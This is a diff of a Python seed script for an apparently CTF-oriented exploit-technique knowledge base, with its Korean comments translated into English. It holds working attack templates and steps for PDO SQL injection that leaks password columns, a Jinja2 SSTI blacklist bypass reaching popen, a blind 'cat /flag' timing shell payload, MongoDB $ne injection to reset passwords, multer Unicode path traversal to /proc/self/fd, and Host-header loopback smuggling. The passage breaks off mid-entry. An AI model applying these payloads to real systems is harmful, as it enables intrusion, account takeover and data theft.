@@ -1,9 +1,9 @@
-"""Exploit technique seed — *문제별 박제가 아니라 transferable trick* 형태.
+"""Exploit technique seed — stored as *transferable tricks*, not per-challenge snapshots.
 
-각 technique은 PayloadPattern (source='technique') 한 행 + attack_metadata에 표준 schema.
-schema 정의/추가 가이드는 agent/eval/KB_SCHEMA.md.
+Each technique is one PayloadPattern row (source='technique') + standard schema in attack_metadata.
+Schema definition / addition guide: agent/eval/KB_SCHEMA.md.
 
-사용:
+Usage:
   docker compose exec backend python manage.py seed_techniques
   docker compose exec backend python manage.py seed_techniques --reset
 """
@@ -20,14 +20,14 @@ from api.embedding_service import (
 from api.models import PayloadPattern, VulnerabilityEntry
 
 
-# ── Technique 정의 ────────────────────────────────────────────
-# 각 entry = 하나의 일반화된 trick.
-# attack_metadata schema (KB_SCHEMA.md의 표준):
+# ── Technique definitions ────────────────────────────────────────────
+# Each entry = one generalized transferable trick.
+# attack_metadata schema (standard from KB_SCHEMA.md):
 #   {
 #     "kind": "exploit_technique",
 #     "name": str,                    # human-readable
-#     "applies_when": str,             # 코드/응답에서 어떤 조건 보이면 적용 가능
-#     "prerequisites": [str, ...],     # 필요 조건 리스트
+#     "applies_when": str,             # conditions in code/response that make this applicable
+#     "prerequisites": [str, ...],     # required conditions
 #     "technique_steps_md": str,       # markdown step-by-step
 #     "code_template": str,            # parametrized payload template
 #     "examples": [                    # known applications
@@ -47,21 +47,21 @@ TECHNIQUES: list[dict] = [
             "kind": "exploit_technique",
             "name": "EXIF passthrough — binary marker + JSON payload",
             "applies_when": (
-                "서버가 업로드된 JPEG의 EXIF에서 `b\"<MARKER>\\x00\"` 같은 magic byte를 검색하고 "
-                "그 다음 바이트를 JSON으로 parse하는 경우 (metadata 검사 류 모든 문제)"
+                "The server searches uploaded JPEG EXIF data for magic bytes like `b\"<MARKER>\\x00\"` "
+                "and parses the following bytes as JSON (applies to all metadata-inspection type challenges)"
             ),
             "prerequisites": [
-                "서버가 piexif/PIL로 EXIF 처리 — 표준 EXIF tag만 dump",
-                "raw bytes append (img.info['exif']) 는 PIL save에서 떨어짐",
-                "MakerNote(0x927C) 또는 UserComment(0x9286) 는 Exif IFD 표준 자유 binary tag",
+                "Server processes EXIF via piexif/PIL — only standard EXIF tags are dumped",
+                "Raw bytes append (img.info['exif']) is dropped by PIL save",
+                "MakerNote(0x927C) or UserComment(0x9286) are standard free-form binary tags in Exif IFD",
             ],
             "technique_steps_md": (
                 "1. piexif.load(image_exif) → exif_dict\n"
                 "2. exif_dict['Exif'][piexif.ExifIFD.MakerNote] = b'<MARKER>\\x00<JSON>'\n"
-                "   또는 piexif.ExifIFD.UserComment 사용 (둘 다 자유 binary)\n"
+                "   or use piexif.ExifIFD.UserComment (both accept free-form binary)\n"
                 "3. piexif.dump(exif_dict) → exif_bytes\n"
                 "4. img.save(out, format='JPEG', exif=exif_bytes)\n"
-                "5. 서버는 exif_data.find(b'<MARKER>\\x00') + len → JSON parse 통과"
+                "5. Server runs exif_data.find(b'<MARKER>\\x00') + len → JSON parse succeeds"
             ),
             "code_template": (
                 "import io, piexif\n"
@@ -82,8 +82,8 @@ TECHNIQUES: list[dict] = [
                         "tag_used": "MakerNote",
                     },
                     "notes": (
-                        "UserComment / MakerNote 둘 다 동일 효과 — 서버 verify는 "
-                        "img.info['exif'] 전체 bytes에서 marker 검색."
+                        "UserComment / MakerNote both produce the same effect — server verification "
+                        "searches for the marker in the full img.info['exif'] bytes."
                     ),
                 },
             ],
@@ -100,26 +100,26 @@ TECHNIQUES: list[dict] = [
             "kind": "exploit_technique",
             "name": "PDO emulate-prepare `?` smuggling — column/identifier injection",
             "applies_when": (
-                "PHP PDO MySQL backend가 emulate prepare 모드(default `PDO::ATTR_EMULATE_PREPARES=true`)"
-                "이고, prepared statement의 SQL string 일부에 사용자 입력이 동적 concat되어 추가 `?` "
-                "토큰을 만들 수 있는 경우. 정상적으로 column/identifier/table name 위치에 입력이 "
-                "들어가지만, 그 안에 `?` 한 개를 박으면 client-side prepare가 다른 placeholder로 인식 "
-                "→ WHERE 절의 `?` 가 unbound로 밀려나고 우리 입력이 그 자리로 들어감."
+                "PHP PDO MySQL backend is in emulate prepare mode (default `PDO::ATTR_EMULATE_PREPARES=true`) "
+                "and user input is dynamically concatenated into part of the prepared statement SQL string, "
+                "allowing injection of an extra `?` token. Input normally goes into a column/identifier/table "
+                "name position, but injecting a single `?` makes client-side prepare treat it as another "
+                "placeholder → the WHERE clause `?` becomes unbound and our input takes its place."
             ),
             "prerequisites": [
-                "PDO + MySQL (다른 backend에서는 server-side prepare로 무효)",
-                "ATTR_EMULATE_PREPARES=true (PDO MySQL 기본값)",
-                "동적 concat된 부분이 backtick으로 감싸지지 않거나, 감싸졌어도 input이 backtick 포함",
-                "execute([single_value]) 같이 placeholder 1개만 바인드하는 호출 패턴",
+                "PDO + MySQL (ineffective on other backends due to server-side prepare)",
+                "ATTR_EMULATE_PREPARES=true (PDO MySQL default)",
+                "Dynamically concatenated part is not wrapped in backticks, or input contains backticks to escape",
+                "Binding pattern uses only one placeholder: execute([single_value])",
             ],
             "technique_steps_md": (
-                "1. 식별: `prepare(\"SELECT $col_param FROM t WHERE x = ?\"); execute([input])` 패턴\n"
-                "2. col_param 에 `\\?#\\x00` 같은 가짜 column name + `?` + comment + null byte 박음\n"
-                "   → SQL: `SELECT \\?#\\0 FROM t WHERE x = ?` (총 ? 2개)\n"
-                "3. PDO emulate prepare가 첫 `?` 를 input 으로 string 치환:\n"
+                "1. Identify: `prepare(\"SELECT $col_param FROM t WHERE x = ?\"); execute([input])` pattern\n"
+                "2. Inject fake column name + `?` + comment + null byte into col_param: e.g. `\\?#\\x00`\n"
+                "   → SQL: `SELECT \\?#\\0 FROM t WHERE x = ?` (2 `?` tokens total)\n"
+                "3. PDO emulate prepare substitutes the first `?` with input as a string:\n"
                 "   `SELECT \\<input_value>#\\0 FROM t WHERE x = ?`\n"
-                "4. input 안에 backtick 으로 column 닫고 임의 SELECT subquery 삽입 + `;#` 으로 뒤 SQL 주석 처리\n"
-                "5. response: 결과를 column-display 안 거치고 `array_values($row)` (CSV/JSON dump) 로 받기"
+                "4. Inside input, close column with backtick and inject arbitrary SELECT subquery + `;#` to comment out trailing SQL\n"
+                "5. Response: retrieve results bypassing column-display via `array_values($row)` (CSV/JSON dump)"
             ),
             "code_template": (
                 "import requests\n"
@@ -128,20 +128,20 @@ TECHNIQUES: list[dict] = [
                 "r = s.get(f'{TARGET}/index.php', params={{\n"
                 "    'col': '\\\\?#\\x00',\n"
                 "    'name': \"x` FROM (SELECT {leak_column} AS `'x` FROM {leak_table})y;#\",\n"
-                "    'download': '1',  # array_values dump 가 가장 robust\n"
-                "}})\nprint(r.text)  # CSV: 한 줄당 한 row"
+                    "    'download': '1',  # array_values dump is most robust\n"
+                "}})\nprint(r.text)  # CSV: one row per line"
             ),
             "examples": [
                 {
                     "params": {
                         "leak_column": "password",
                         "leak_table": "users",
-                        "post_exploit": "admin login → 추가 공격 체인 가능",
+                        "post_exploit": "admin login → further attack chain possible",
                     },
                     "notes": (
-                        "ref: slcyber.io PDO 연구. CSV download 옵션이 column-name 매핑 우회에 유용 — "
-                        "displayColumns 가 colParam 로만 결정되므로 HTML table은 `-` 로 표시되지만 "
-                        "?download=1 의 array_values 는 실제 SELECT 결과를 그대로 dump."
+                        "ref: slcyber.io PDO research. CSV download option is useful for bypassing column-name "
+                        "mapping — displayColumns is determined solely by colParam so the HTML table shows `-`, "
+                        "but ?download=1 with array_values dumps the actual SELECT results as-is."
                     ),
                 },
             ],
@@ -158,32 +158,32 @@ TECHNIQUES: list[dict] = [
             "kind": "exploit_technique",
             "name": "safe_eval / Jinja2 attribute chain — filter bypass",
             "applies_when": (
-                "사용자 입력이 eval() / safe_eval() / render_template_string() 같은 sink에 전달되며 "
-                "allowed_globals 또는 Jinja2 환경에 os/__builtins__/__class__/__mro__ 류가 노출. "
-                "BLACKLIST 필터(`(`, `)`, `__`, `os`, `import` 등)가 있어도 attribute access "
-                "(`a.b.c`), Jinja2 `attr()` filter, `~` 문자열 결합, 표준 dict access로 우회 가능."
+                "User input reaches a sink like eval() / safe_eval() / render_template_string(), and "
+                "allowed_globals or the Jinja2 environment exposes os/__builtins__/__class__/__mro__. "
+                "Even with BLACKLIST filters (`(`, `)`, `__`, `os`, `import`, etc.), bypass is possible via "
+                "attribute access (`a.b.c`), Jinja2 `attr()` filter, `~` string concat, or standard dict access."
             ),
             "prerequisites": [
-                "input이 attribute access (`a.b`) 형태 가능한 sink",
-                "결과가 응답 본문/error/debug에 노출되거나 또는 side-effect (file read, OOB) 가능",
-                "필터 우회: '(' 차단 시 dict comprehension 또는 standard data access "
+                "Input reaches a sink that allows attribute access (`a.b`) expressions",
+                "Result is exposed in response body/error/debug or side-effects (file read, OOB) are possible",
+                "Filter bypass: if '(' is blocked, use dict comprehension or standard data access "
                 "(`os.environ`, `request.application.__globals__`)",
-                "Jinja2의 경우 `cycler|attr('_'~'_'~'init'~'_'~'_')|attr('_'~'_'~'globals'~'_'~'_')` 식 chain",
+                "For Jinja2: `cycler|attr('_'~'_'~'init'~'_'~'_')|attr('_'~'_'~'globals'~'_'~'_')` style chain",
             ],
             "technique_steps_md": (
-                "1. sink 식별: `eval(value)`, `safe_eval(value)`, `{{ value }}` (Jinja2 SSTI)\n"
-                "2. allowed_globals/builtins/class chain 매핑:\n"
-                "   - Python eval: `os.environ` (가장 단순), `__builtins__.eval`, "
+                "1. Identify sink: `eval(value)`, `safe_eval(value)`, `{{ value }}` (Jinja2 SSTI)\n"
+                "2. Map allowed_globals/builtins/class chain:\n"
+                "   - Python eval: `os.environ` (simplest), `__builtins__.eval`, "
                 "`().__class__.__mro__[1].__subclasses__()`\n"
-                "   - Jinja2: `cycler|attr('__init__')|attr('__globals__')|...` 또는 "
+                "   - Jinja2: `cycler|attr('__init__')|attr('__globals__')|...` or "
                 "`config.from_object`, `request.application.__globals__`\n"
-                "3. 필터 통과: '(' 금지면 dict access — `os.environ` 자체가 dict이므로 호출 불필요\n"
-                "4. 출력: 응답 body의 debug/error/template render 결과에서 추출"
+                "3. Filter bypass: if '(' is forbidden, use dict access — `os.environ` is a dict so no call needed\n"
+                "4. Output: extract from response body debug/error/template render result"
             ),
             "code_template": (
                 "# Python eval/safe_eval\n"
-                "payload = {expr}  # 예: 'os.environ'\n\n"
-                "# Jinja2 SSTI BLACKLIST 우회\n"
+                "payload = {expr}  # e.g.: 'os.environ'\n\n"
+                "# Jinja2 SSTI BLACKLIST bypass\n"
                 "payload = '{{ cycler|attr(\"_~_~init~_~_\".replace(\"~\",\"\"))'\n"
                 "          '|attr(\"_~_~globals~_~_\".replace(\"~\",\"\"))'\n"
                 "          '|attr(\"get\")(\"o~s\".replace(\"~\",\"\"))'\n"
@@ -195,28 +195,28 @@ TECHNIQUES: list[dict] = [
                     "params": {
                         "sink": "safe_eval (Python)",
                         "expr": "os.environ",
-                        "filter_bypassed": ["( 차단", ") 차단", "domain regex 통과 필요"],
+                        "filter_bypassed": ["( blocked", ") blocked", "domain regex must pass"],
                         "output_path": "TRACE /verify response debug field",
                     },
-                    "notes": "ImageDescription tag → safe_eval → dict(os.environ) → FLAG env 노출",
+                    "notes": "ImageDescription tag → safe_eval → dict(os.environ) → FLAG env leaked",
                 },
                 {
                     "transferable_verified": True,
                     "params": {
                         "sink": "Jinja2 render_template_string",
                         "expr": "cycler|attr('_'~'_'~'init'~'_'~'_')|attr(...)|attr('po'~'pen')",
-                        "bypass_chars": "~ (concat, + 차단), attr() (. [] 차단), 'o'~'s' (os 차단)",
+                        "bypass_chars": "~ (concat, + blocked), attr() (. [] blocked), 'o'~'s' (os blocked)",
                         "filter_bypassed": [
                             "BLACKLIST: __ . [ ] + request config os subprocess "
                             "import init globals open read mro class",
                         ],
                         "output_path": "bash `case $(cat /flag|cut -c N) in C) sleep 4 ;; esac` "
-                                       "→ POST /write 응답 시간 (selenium bot block until /article load)",
+                                       "→ POST /write response time (selenium bot blocks until /article load)",
                         "verified_signal": "baseline 2.45s, sleep trigger 5.37s, threshold 4.85s",
                     },
                     "notes": (
-                        "OOB 불가 (iptables outgoing DROP). transferable 증명 — "
-                        "Python eval 패턴이 Jinja2 SSTI 변형으로 그대로 적용."
+                        "OOB not possible (iptables outgoing DROP). Transferability proven — "
+                        "Python eval pattern applies directly as a Jinja2 SSTI variant."
                     ),
                 },
             ],
@@ -233,29 +233,29 @@ TECHNIQUES: list[dict] = [
             "kind": "exploit_technique",
             "name": "multiRequest Host-header loopback smuggling",
             "applies_when": (
-                "Node 서버가 내부적으로 request 를 fan-out 할 때 hostname/port 를 "
-                "클라이언트가 보낸 Host 헤더에서 파싱하는 경우. "
-                "multiRequest 기능 (path fragment 에 ',' 포함 시 split 후 http.get) 에서 "
-                "`req.headers.host.split(':')` 로 target 결정. 이때 Host: localhost:port 로 "
-                "보내면 서버가 자기 자신에게 loopback 요청 → req.socket.remoteAddress=127.0.0.1."
+                "A Node server parses hostname/port from the client-supplied Host header when "
+                "fanning out internal requests. The multiRequest feature (splits on ',' in path "
+                "fragment then fires http.get for each) uses `req.headers.host.split(':')` to "
+                "determine the target. Sending Host: localhost:port makes the server issue a "
+                "loopback request to itself → req.socket.remoteAddress=127.0.0.1."
             ),
             "prerequisites": [
-                "서버 코드가 `req.socket.remoteAddress` 로 IP 체크 (127.0.0.1 whitelist 등)",
-                "dyson-generators 류 또는 유사하게 Host 헤더 기반 내부 redirect 가능",
-                "route 가 multiRequest middleware 경유",
-                "multiRequest delimiter (기본 ',') 알려져 있음",
+                "Server code checks `req.socket.remoteAddress` for IP (127.0.0.1 whitelist, etc.)",
+                "dyson-generators or similar framework allowing Host header-based internal redirect",
+                "Route goes through multiRequest middleware",
+                "multiRequest delimiter (default ',') is known",
             ],
             "technique_steps_md": (
-                "1. 서버 코드에서 IP 체크 / internal-only 엔드포인트 식별.\n"
-                "2. 동일 서버의 route 중 multiRequest 지원 middleware 경유하는 것 찾기 "
-                "(dyson-generators 류는 모든 route 기본 지원).\n"
-                "3. URL path 에 ',' 포함한 fragment 삽입 — fragment 를 split 후 각 id 로 "
-                "path.replace(arr, id) 해서 loopback http.get.\n"
-                "4. **Host 헤더를 `localhost:<internal_port>` 로 설정** — 서버가 자기 자신에게 "
-                "내부 요청. 그 요청의 remoteAddress = 127.0.0.1.\n"
-                "5. 반드시 적어도 한 sub-request url 이 target route 에 매치되도록 "
-                "`,` 양쪽 조각이 유효 path 가 되게 배치. query string 전달은 `?` 사이에 끼워 "
-                "넣기 (예: `/api/X?guess=V&extra,X?guess=V`).\n"
+                "1. Identify IP check / internal-only endpoints in the server code.\n"
+                "2. Find routes on the same server that go through multiRequest middleware "
+                "(dyson-generators enables this on all routes by default).\n"
+                "3. Insert a fragment containing ',' in the URL path — after split, each id is used in "
+                "path.replace(arr, id) for loopback http.get.\n"
+                "4. **Set Host header to `localhost:<internal_port>`** — the server makes an internal "
+                "request to itself. That request's remoteAddress = 127.0.0.1.\n"
+                "5. Ensure at least one sub-request URL matches the target route by arranging "
+                "both sides of `,` as valid paths. Pass query strings by interleaving with `?` "
+                "(e.g. `/api/X?guess=V&extra,X?guess=V`).\n"
             ),
             "code_template": (
                 "# url template: /<route>?<params>&<pad>,<route_tail>?<params>\n"
@@ -299,28 +299,28 @@ TECHNIQUES: list[dict] = [
             "kind": "exploit_technique",
             "name": "JS Automatic Semicolon Insertion — const literal overwrite",
             "applies_when": (
-                "JavaScript 소스에서 `const X = \"<value>\"` 뒤에 세미콜론 없이 다음 줄이 "
-                "`[a, b] = expr` 로 시작하는 경우. ASI 는 string literal 다음에 오는 `[` 를 "
-                "member-access 로 해석해서 세미콜론 삽입 안 함 → 전체가 `const X = \"...\"[a,b] = expr` "
-                "한 statement 로 파싱. comma expression `[a,b]` 는 `b` 평가 → "
-                "`\"...\"[b] = expr` 은 string prop 할당 (sloppy mode silent fail), 할당식 값=expr. "
-                "결국 `const X = expr` — 공격자 제어 값으로 const 를 덮어씀."
+                "In JavaScript source, `const X = \"<value>\"` is not followed by a semicolon and the "
+                "next line starts with `[a, b] = expr`. ASI interprets `[` after a string literal as "
+                "member-access and does not insert a semicolon → the whole thing is parsed as a single "
+                "statement `const X = \"...\"[a,b] = expr`. The comma expression `[a,b]` evaluates to `b` → "
+                "`\"...\"[b] = expr` is a string prop assignment (silent fail in sloppy mode), and the "
+                "assignment expression value = expr. Result: `const X = expr` — const overwritten with attacker-controlled value."
             ),
             "prerequisites": [
-                "분석 가능한 JS 소스 (blackbox 에서는 어려움, 단 소스 유출/writeup 시)",
-                "선언부: `const X = \"literal\"` 뒤에 세미콜론 누락",
-                "바로 다음 줄: `[var1, var2] = <attacker_controlled_expr>`",
-                "sloppy mode (엄격 모드면 TypeError — strict 가 아니어야 함)",
-                "후속 비교: `X == something` 에서 공격자가 expr 값을 양쪽 중 하나와 같게 만들 수 있음",
+                "Analyzable JS source (difficult in blackbox, but possible with source leak/writeup)",
+                "Declaration: `const X = \"literal\"` missing semicolon at end",
+                "Immediately next line: `[var1, var2] = <attacker_controlled_expr>`",
+                "Sloppy mode (strict mode would throw TypeError — must not be strict)",
+                "Subsequent comparison: `X == something` where attacker can make expr value equal to one side",
             ],
             "technique_steps_md": (
-                "1. JS 소스에서 `const ... = \"...\"` 뒤 세미콜론 빠진 줄 검색.\n"
-                "2. 다음 줄이 `[...] = <expr>` 패턴이면 `X` 가 expr 로 덮어쓰기됨.\n"
-                "3. 비교 문 (`if (X == target)`) 확인 — target 이 공격자 제어 expr 결과와 "
-                "같게 만들면 체크 우회.\n"
-                "4. JS 동등 비교 (`==`) 의 coercion 활용 — 예: `[\"0000\"] == false` → "
+                "1. Search JS source for `const ... = \"...\"` lines missing a trailing semicolon.\n"
+                "2. If the next line matches `[...] = <expr>` pattern, `X` is overwritten with expr.\n"
+                "3. Check for comparison (`if (X == target)`) — if attacker can make expr result "
+                "equal to target, the check is bypassed.\n"
+                "4. Exploit JS loose equality (`==`) coercion — e.g.: `[\"0000\"] == false` → "
                 "array→string `\"0000\"` → number `0` ↔ `false` → `0` → true.\n"
-                "5. expr 소스 (req.query, req.body 등) 에 payload 주입.\n"
+                "5. Inject payload into expr source (req.query, req.body, etc.).\n"
             ),
             "code_template": (
                 "// vulnerable source pattern:\n"
@@ -340,15 +340,16 @@ TECHNIQUES: list[dict] = [
                     "notes": (
                         "const SecretVariable = \"[REDACTED]\"\\n[param1, param2] = "
                         "req.query.guess !== undefined ? atob(req.query.guess).split(\"|\") : [...] "
-                        "→ ASI 실패로 한 문장. 공격자가 guess 제어 → SecretVariable 자체가 "
-                        "array 로 덮어짐. 비교 피연산자가 false(초기값) 이므로 array→0 coercion 으로 매치."
+                        "→ ASI fails, parsed as one statement. Attacker controls guess → SecretVariable "
+                        "itself is overwritten with an array. Comparison operand is false (initial value), "
+                        "so array→0 coercion matches."
                     ),
                 },
             ],
             "tags": ["javascript", "asi", "const", "type-coercion", "nodejs"],
         },
     },
-    # ── NoSQL / path traversal techniques ──
+    # ── NoSQL / path traversal techniques ────────────────────────
     {
         "name": "mongodb_regexp_injection_email_leak",
         "vuln_type": "nosql_injection",
@@ -359,22 +360,22 @@ TECHNIQUES: list[dict] = [
             "kind": "exploit_technique",
             "name": "MongoDB RegExp injection — character-by-character data leak",
             "applies_when": (
-                "서버가 사용자 입력을 sanitize 없이 `new RegExp(input)` 으로 변환하여 "
-                "MongoDB `findOne({field: regex})` 등에 사용하는 경우. 공격자가 regex 메타문자 "
-                "(`^`, `.*`, `$`, `[a-z]` 등)를 삽입하여 존재하는 데이터를 한 글자씩 brute-force. "
-                "전형적으로 registration duplicate check, search, login 등에서 발견."
+                "The server converts user input to `new RegExp(input)` without sanitization and "
+                "uses it in MongoDB queries like `findOne({field: regex})`. An attacker can inject regex "
+                "metacharacters (`^`, `.*`, `$`, `[a-z]`, etc.) to brute-force existing data one character "
+                "at a time. Typically found in registration duplicate checks, search, login, etc."
             ),
             "prerequisites": [
-                "사용자 입력이 `new RegExp()` 또는 `{$regex: input}` 에 직접 전달",
-                "결과가 존재/미존재를 구분 가능한 응답 차이 (400 'exists' vs 200 'ok' 등)",
-                "brute-force 가능한 응답 속도 (rate limiting 미적용 또는 느슨)",
+                "User input is passed directly to `new RegExp()` or `{$regex: input}`",
+                "Response differentiates between exists/not-exists (e.g. 400 'exists' vs 200 'ok')",
+                "Response speed allows brute-force (no rate limiting or loose limits)",
             ],
             "technique_steps_md": (
-                "1. 대상 필드에 regex 메타문자가 동작하는지 확인: `^a.*` 전송 → 기존 데이터 매치 여부\n"
-                "2. 한 글자씩 접두사 확장: `^guide_a.*`, `^guide_ab.*`, ... → 존재 응답이면 해당 글자 확정\n"
-                "3. 더 이상 매치되는 글자가 없으면 해당 접두사가 전체 값\n"
-                "4. 특수문자 처리: regex 메타문자 (`$`, `*`, `+` 등)는 character class `[$]`, `[*]` 로 escape\n"
-                "5. 추출된 값(이메일, 토큰 등)을 다음 공격 단계에 활용"
+                "1. Verify regex metacharacters work on the target field: send `^a.*` → check if existing data matches\n"
+                "2. Extend prefix one character at a time: `^guide_a.*`, `^guide_ab.*`, ... → if exists response, that character is confirmed\n"
+                "3. When no more characters match, the current prefix is the full value\n"
+                "4. Handle special characters: escape regex metacharacters (`$`, `*`, `+`, etc.) using character classes `[$]`, `[*]`\n"
+                "5. Use extracted value (email, token, etc.) for the next attack stage"
             ),
             "code_template": (
                 "import string, requests\n"
@@ -389,7 +390,7 @@ TECHNIQUES: list[dict] = [
                 "            if '{exists_indicator}' in r.text:\n"
                 "                nxt.append(pfx + ch)\n"
                 "    prefixes = nxt\n"
-                "# prefixes 에 없으면 마지막 prefix 가 전체 값"
+                "# if prefixes is empty, the last prefix is the full value"
             ),
             "examples": [
                 {
@@ -401,10 +402,10 @@ TECHNIQUES: list[dict] = [
                         "charset": "a-z0-9",
                     },
                     "notes": (
-                        "registration duplicate check에서 email이 RegExp으로 변환됨. "
-                        "prefix 체크를 `^prefix_` 로 우회 — "
-                        "서버가 `'^' + '^prefix_a.*' + '$'` = `^^prefix_a.*$` 으로 만들어도 "
-                        "JS regex에서 `^^` 는 `^` 와 동일."
+                        "Email is converted to RegExp in the registration duplicate check. "
+                        "Bypass prefix check with `^prefix_` — "
+                        "even if the server constructs `'^' + '^prefix_a.*' + '$'` = `^^prefix_a.*$`, "
+                        "in JS regex `^^` is equivalent to `^`."
                     ),
                 },
             ],
@@ -421,25 +422,25 @@ TECHNIQUES: list[dict] = [
             "kind": "exploit_technique",
             "name": "MongoDB operator injection ($ne/$gt/$regex) — auth/token bypass",
             "applies_when": (
-                "Express/Node 서버에서 `req.body` 를 JSON으로 파싱한 뒤, 그 값을 직접 "
-                "MongoDB query (`findOne({field: value})`)에 전달하는 경우. "
-                "`bodyParser.json()` 이 object/array도 파싱하므로 `{\"field\": {\"$ne\": null}}` "
-                "전송 시 `findOne({field: {$ne: null}})` → token/password/secret 이 null이 "
-                "아닌 모든 document 매치. password reset, API key 검증, 2FA token 체크 등에 적용."
+                "An Express/Node server parses `req.body` as JSON and passes the value directly "
+                "to a MongoDB query (`findOne({field: value})`). Since `bodyParser.json()` also parses "
+                "objects/arrays, sending `{\"field\": {\"$ne\": null}}` results in "
+                "`findOne({field: {$ne: null}})` → matches all documents where token/password/secret "
+                "is not null. Applies to password reset, API key verification, 2FA token checks, etc."
             ),
             "prerequisites": [
-                "Express bodyParser.json() 또는 유사 JSON body parser 사용",
-                "req.body 값이 sanitize 없이 MongoDB query에 전달",
-                "대상 필드에 non-null 값이 존재하는 document가 DB에 있음",
-                "Mongoose의 SchemaType validation이 String으로 제한되지 않거나 우회 가능",
+                "Express bodyParser.json() or similar JSON body parser in use",
+                "req.body values are passed to MongoDB queries without sanitization",
+                "Documents with non-null values exist in the DB for the target field",
+                "Mongoose SchemaType validation is not restricted to String, or can be bypassed",
             ],
             "technique_steps_md": (
-                "1. password reset 등에서 token/code 를 body로 보내는 API 식별\n"
-                "2. 먼저 정상 flow로 대상 계정에 token 생성 요청 (예: email 전송)\n"
-                "3. token 필드에 `{\"$ne\": null}` 전송 → 해당 token이 존재하는 아무 user 매치\n"
-                "   변형: `{\"$gt\": \"\"}` (빈 문자열보다 큰 모든 값), `{\"$regex\": \".*\"}` (모든 값)\n"
-                "4. 매치된 user에 대해 password 변경 / 2FA 우회 / 세션 탈취\n"
-                "5. 변경된 credential로 로그인"
+                "1. Identify API that sends token/code in the body (e.g. password reset)\n"
+                "2. First, trigger normal flow to generate a token for the target account (e.g. send email)\n"
+                "3. Send `{\"$ne\": null}` in the token field → matches any user with an existing token\n"
+                "   Variants: `{\"$gt\": \"\"}` (all values greater than empty string), `{\"$regex\": \".*\"}` (all values)\n"
+                "4. Change password / bypass 2FA / hijack session for the matched user\n"
+                "5. Login with the changed credentials"
             ),
             "code_template": (
                 "import requests\n"
@@ -465,8 +466,8 @@ TECHNIQUES: list[dict] = [
                     "notes": (
                         "resetPassword flow: (1) email→generateToken → sets resetPassToken, "
                         "(2) token→sendResetPassword → User.findOne({resetPassToken: token}). "
-                        "sendMail=false 면 메일 안 보내도 token 생성됨. "
-                        "$ne:null 로 token 존재하는 아무 user 매치 → 비번 리셋."
+                        "sendMail=false generates the token without sending email. "
+                        "$ne:null matches any user with an existing token → password reset."
                     ),
                 },
             ],
@@ -483,26 +484,26 @@ TECHNIQUES: list[dict] = [
             "kind": "exploit_technique",
             "name": "Multer latin1→utf8 Unicode path traversal (丯 = /)",
             "applies_when": (
-                "Express + multer 파일 업로드에서 filename을 `Buffer.from(name, 'latin1').toString('utf-8')` "
-                "로 변환하고, 결과를 `diskStorage` 의 filename callback에 그대로 사용하는 경우. "
-                "RFC5987 `filename*=UTF-8''...` 인코딩으로 Unicode 문자 `丯` (U+4E2F, UTF-8: E4 B8 AF) "
-                "를 보내면, latin1→utf8 변환 후 OS 경로에서 `/` 로 해석되어 업로드 디렉터리 탈출."
+                "Express + multer file upload converts filename via `Buffer.from(name, 'latin1').toString('utf-8')` "
+                "and uses the result directly in the `diskStorage` filename callback. "
+                "Sending Unicode character `丯` (U+4E2F, UTF-8: E4 B8 AF) via RFC5987 `filename*=UTF-8''...` "
+                "encoding causes the latin1→utf8 conversion to produce `/` in the OS path, escaping the upload directory."
             ),
             "prerequisites": [
-                "multer diskStorage 사용 (메모리 스토리지는 파일 안 씀)",
-                "filename callback이 `file.originalname` 을 path.basename() 없이 그대로 사용",
-                "latin1→utf8 변환 로직 존재 (일부 multer 설정에서 CJK filename 지원용으로 추가)",
-                "guide/admin 등 업로드 권한이 있는 계정 필요 (별도 auth bypass와 조합)",
+                "multer diskStorage in use (memory storage does not write files)",
+                "filename callback uses `file.originalname` directly without path.basename()",
+                "latin1→utf8 conversion logic exists (added in some multer configs for CJK filename support)",
+                "Account with upload permissions needed (e.g. guide/admin — combine with separate auth bypass)",
             ],
             "technique_steps_md": (
-                "1. 업로드 엔드포인트와 multer 설정 확인 (diskStorage + filename callback)\n"
-                "2. `Buffer.from(name, 'latin1').toString('utf-8')` 변환 여부 확인\n"
-                "3. multipart form에 RFC5987 encoding 사용:\n"
+                "1. Verify the upload endpoint and multer config (diskStorage + filename callback)\n"
+                "2. Confirm `Buffer.from(name, 'latin1').toString('utf-8')` conversion is present\n"
+                "3. Use RFC5987 encoding in the multipart form:\n"
                 "   `Content-Disposition: form-data; name=\"image\"; filename*=UTF-8''..%E4%B8%AF..%E4%B8%AF...target`\n"
-                "   `..丯` = `../` 에 해당 (丯 의 UTF-8 E4 B8 AF → latin1 해석 → utf8 → `/`)\n"
-                "4. traversal depth: `..丯` 를 충분히 반복하여 root까지 탈출 (13회 정도)\n"
-                "5. 타겟 경로 (예: `/proc/self/fd/N`, `/tmp/exploit.sh`) 에 payload 기록\n"
-                "6. 후속: /proc/self/fd/ 로 Node process 메모리 조작 (ROP) 또는 cron/script 덮어쓰기"
+                "   `..丯` equals `../` (丯's UTF-8 E4 B8 AF → interpreted as latin1 → utf8 → `/`)\n"
+                "4. Traversal depth: repeat `..丯` enough times to escape to root (~13 times)\n"
+                "5. Write payload to target path (e.g. `/proc/self/fd/N`, `/tmp/exploit.sh`)\n"
+                "6. Follow-up: manipulate Node process memory via /proc/self/fd/ (ROP) or overwrite cron/script"
             ),
             "code_template": (
                 "from urllib.parse import quote\n"
@@ -523,18 +524,18 @@ TECHNIQUES: list[dict] = [
                         "endpoint": "PUT /api/answers/:uuid (multer upload.single('image'))",
                         "encoding_line": "file.originalname = Buffer.from(file.originalname, 'latin1').toString('utf-8')",
                         "unicode_char": "丯 (U+4E2F)",
-                        "traversal_target": "/proc/self/fd/N (ROP) 또는 /tmp/ (arbitrary write)",
+                        "traversal_target": "/proc/self/fd/N (ROP) or /tmp/ (arbitrary write)",
                     },
                     "notes": (
-                        "auth bypass로 권한 획득 후, multer 업로드로 path traversal. "
-                        "ROP payload를 /proc/self/fd/에 쓰면 Node process crash → execve 가능."
+                        "After obtaining privileges via auth bypass, use multer upload for path traversal. "
+                        "Writing ROP payload to /proc/self/fd/ can crash the Node process → execve possible."
                     ),
                 },
             ],
             "tags": ["path-traversal", "multer", "unicode", "file-upload", "encoding"],
         },
     },
-    # ── PHP sandbox escape technique ──
+    # ── PHP sandbox escape technique ────────────────────────────
     {
         "name": "php_open_basedir_race_pcntl_fork",
         "vuln_type": "open_basedir_bypass",
@@ -545,31 +546,31 @@ TECHNIQUES: list[dict] = [
             "kind": "exploit_technique",
             "name": "PHP open_basedir bypass — pcntl_fork + rename race on getcwd/MAXPATHLEN",
             "applies_when": (
-                "PHP 8.x 환경에서 `open_basedir`이 `/tmp` 등으로 제한되어 있고, "
